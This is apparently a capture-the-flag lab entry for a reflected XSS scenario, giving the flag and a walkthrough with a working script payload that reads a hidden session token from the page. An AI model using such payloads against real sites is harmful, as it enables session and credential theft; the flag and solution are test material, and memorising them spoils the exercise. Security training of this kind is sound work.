# Scenario 12: Reflected XSS into HTML Context

- **Port:** `8012`
- **Vulnerability:** Reflected Cross-Site Scripting (HTML Context)
- **Flag:** `CTF{r3fl3ct3d_xss_b4s1cs}`

## Exploitation Walkthrough
1. Access `http://<host>:8012/search?q=test`.
2. Observe search input reflected in HTML without sanitization.
3. Inspect DOM to locate hidden session element `<input type="hidden" id="user_token" value="...">`.
4. Inject XSS payload via URL or Burp Suite:
   ```html
   <script>document.getElementById('vault-display').innerText=document.getElementById('user_token').value;</script>
   ```
5. Observe execution and capture flag.
